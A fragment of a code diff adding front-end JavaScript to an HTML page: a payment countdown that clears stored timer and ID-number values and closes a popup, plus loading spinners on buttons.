+                    countdownEl.classList.add('text-red-600');
+                    localStorage.removeItem('paymentTimeLeft');
+                    localStorage.removeItem('userNIK');
+                    
+                    // Auto close popup after 3 seconds
+                    setTimeout(() => {
+                        paymentPopup.classList.add('hidden');
+                    }, 3000);
+                } else {
+                    // Update localStorage
+                    localStorage.setItem('paymentTimeLeft', timeLeft);
+                }
+                
+                timeLeft--;
+            }, 1000);
+        }
+        
+        // Add loading animation to all buttons
+        document.querySelectorAll('button').forEach(button => {
+            if (!button.querySelector('.spinner')) {
+                const spinner = document.createElement('div');
+                spinner.className = 'spinner ml-2';
+                button.appendChild(spinner);
+            }
+            
+            button.addEventListener('click', function() {
+                if (this.id !== 'accelerationBtn' && 
+                    this.id !== 'submitNik' && 
+                    this.id !== 'cancelNik' && 
+                    this.id !== 'paymentContinue') {
+                    
+                    const spinner = this.querySelector('.spinner');
+                    const btnText = this.querySelector('span') || this.childNodes[0];
+                    
+                    if (spinner && btnText) {
+                        spinner.style.display = 'inline-block';
+                        this.disabled = true;
+                        
+                        setTimeout(() => {
+                            spinner.style.display = 'none';
+                            this.disabled = false;
+                        }, 1000);
+                    }
+                }
+            });
+        });
+        
+        // Initialize on page load
+        initializeTimer();
     </script>
 </body>
 </html>
